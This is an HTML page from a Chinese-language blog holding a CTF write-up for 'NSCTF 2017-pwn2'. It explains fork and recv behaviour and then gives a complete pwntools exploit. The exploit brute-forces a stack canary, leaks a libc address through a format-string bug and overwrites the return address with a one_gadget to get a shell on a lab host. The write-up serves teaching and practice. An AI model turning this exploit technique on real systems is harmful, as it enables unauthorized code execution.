@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>NSCTF 2017-pwn2 | closefrom</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://closefrom.github.io/favicon.ico?v=1615649066608">
+<link rel="stylesheet" href="https://closefrom.github.io/styles/main.css">
+
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="（ps：多线程canary爆破）
+文件链接：https://pan.baidu.com/s/17pIc0RrfLRH9arMbJmJGjA
+提取码：4olb
+{前置知识：
+1.fork入门知识
+一个进程，包括代码、数据和分配给进程的资源。f..." />
+    <meta name="keywords" content="pwn" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://closefrom.github.io">
+        <img src="https://closefrom.github.io/images/avatar.png?v=1615649066608" class="site-logo">
+        <h1 class="site-title">closefrom</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="https://closefrom.github.io/archives" class="site-nav">
+            文章汇总
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            文章标签分类
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      The deeper you explore, the more you close from the truth
+    </div>
+    <div class="site-footer">
+      <div>
+	<a href="https://www.zyglz.com"> © 资源管理站</a>
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	<p><span id="busuanzi_container_site_uv" style='display:none'>总访客人数量<span id="busuanzi_value_site_uv"></span>次</span></p>
+	<p><span id="busuanzi_container_site_pv" style='display:none'>本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></p>
+</div>
+Powered by <a href="https://github.com/getgridea/gridea" target="_blank">closefrom</a> | <a class="rss" href="https://closefrom.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">NSCTF 2017-pwn2</h2>
+            <div class="post-date">2021-03-13</div>
+            
+            <div class="post-content" v-pre>
+              <p>（ps：多线程canary爆破）<br>
+文件链接：https://pan.baidu.com/s/17pIc0RrfLRH9arMbJmJGjA<br>
+提取码：4olb<br>
+{前置知识：<br>
+1.fork入门知识<br>
+一个进程，包括代码、数据和分配给进程的资源。fork（）函数通过系统调用创建一个与原来进程几乎完全相同的进程，也就是两个进程可以做完全相同的事，但如果初始参数或者传入的变量不同，两个进程也可以做不同的事。<br>
+fork调用的一个奇妙之处就是它仅仅被调用一次，却能够返回两次，它可能有三种不同的返回值：<br>
+1）在父进程中，fork返回新创建子进程的进程ID；	<br>
+2）在子进程中，fork返回0；<br>
+3）如果出现错误，fork返回一个负值；</p>
+<ol start="2">
+<li>
+<p>recv函数一旦被调用，就会尝试获取缓冲中的数据，只要有数据，就会直接返回，如果缓冲中的数据大于1024，最多返回1024字节，不过如果缓冲只有400，也只会返回400，这是recv函数的读取机制</p>
+</li>
+<li>
+<p>xrange 语法：<br>
+xrange(stop)<br>
+xrange(start, stop[, step])<br>
+参数说明：<br>
+start: 计数从 start 开始。默认是从 0 开始。例如 xrange(5) 等价于 xrange(0， 5)<br>
+stop: 计数到 stop 结束，但不包括 stop。例如：xrange(0， 5) 是 [0, 1, 2, 3, 4] 没有 5<br>
+step：步长，默认为1。例如：xrange(0， 5) 等价于 xrange(0, 5, 1)</p>
+</li>
+<li>
+<p>chr() 方法的语法: chr(i)<br>
+chr() 用一个范围在 range（256）内的（就是0～255）整数作参数，返回一个对应的字符。<br>
+参数：i -- 可以是10进制也可以是16进制的形式的数字。<br>
+返回值：返回值是当前整数对应的 ASCII 字符。<br>
+例：</p>
+</li>
+</ol>
+<pre><code>
+>>>print chr(0x30), chr(0x31), chr(0x61)   # 十六进制
+0 1 a
+>>> print chr(48), chr(49), chr(97)         # 十进制
+0 1 a
+</code></pre>
+<p>}</p>
+<p>1.搭建题目环境，查看文件保护机制，ubuntu运行ida*32远程调试文件<br>
+<img src="https://closefrom.github.io/post-images/1615579873136.png" alt="" loading="lazy"><br>
+<img src="https://closefrom.github.io/post-images/1615579882085.png" alt="" loading="lazy"><br>
+<img src="https://closefrom.github.io/post-images/1615579889787.png" alt="" loading="lazy"></p>
+<p>2.ida*32打开程序分析：<br>
+<img src="https://closefrom.github.io/post-images/1615579901366.png" alt="" loading="lazy"><br>
+若输入Y，则打开一个子进程。并且在子进程中进入含有格式化字符串漏洞和栈溢出漏洞的sub_80487FA函数<br>
+<img src="https://closefrom.github.io/post-images/1615579916035.png" alt="" loading="lazy"><br>
+由于有格式化字符串漏洞，所以可以直接泄露canary，但是这题程序是32位的，所以可以用爆破canary来做。<br>
+思路：泄露栈中的libc的got地址，计算偏移算出one_gadget，以及爆破出canary，进行getshell<br>
+ubuntu运行程序，ida远程attach 子进程，在栈中找到libc地址，通过查看栈中数据，方便计算出padding，canary，返回地址的位置，写出相应的栈溢出payload</p>
+<pre><code>
+from pwn import *
+
+context.binary = './pwn2'
+#local_libc.so.6 
+libc__cxa_atexit_add = 0x2e9d0
+libc_one_gadget = 0x3a80c
+
+canary = '\x00'
+link = remote("192.168.93.137","6666")
+for i in xrange(3):
+    for j in xrange(256):
+        link.sendline('Y')
+        link.recvuntil("please:\n")
+        link.sendline("%19$p")
+        link.recvuntil("game ")
+        libc_add = int(link.recv(10),16)
+        test1 = link.recv()
+        print test1
+        payload = 'A' * 0x10 + canary + chr(j)
+        link.send(payload)
+        test2 = link.recv()
+        test3 = link.recv(timeout=0.1) #子进程才到结束到父进程
+        print test2 
+        print test3 == "" 
+        #若输出了第二个Do you love me?[Y]则表示当前canary字节爆破成功
+        if (test3 != ""):
+            canary += chr(j)
+            break;
+canary = u32(canary) #爆破出来的是字符，所以要u32 转为整数
+one_gadget_add = libc_add - libc__cxa_atexit_add - 0x1b + libc_one_gadget
+link.sendline('Y')
+link.recvuntil("please:\n")
+link.sendline('1')
+link.recvuntil("Id:\n")
+payload = 'A' * 0x10 + p32(canary) + 'B' * 0xc + p32(one_gadget_add)
+link.send(payload)
+link.interactive()
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://closefrom.github.io/post-images/1615579950492.png" alt="" loading="lazy"></figure>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://closefrom.github.io/tag/mQz58myZ-/" class="tag">
+                    pwn
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://closefrom.github.io/post/csaw-quals-ctf-2017-pwn-scv/">
+                  <h3 class="post-title">
+                    CSAW Quals CTF 2017 pwn scv
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+
+  </body>
+</html>
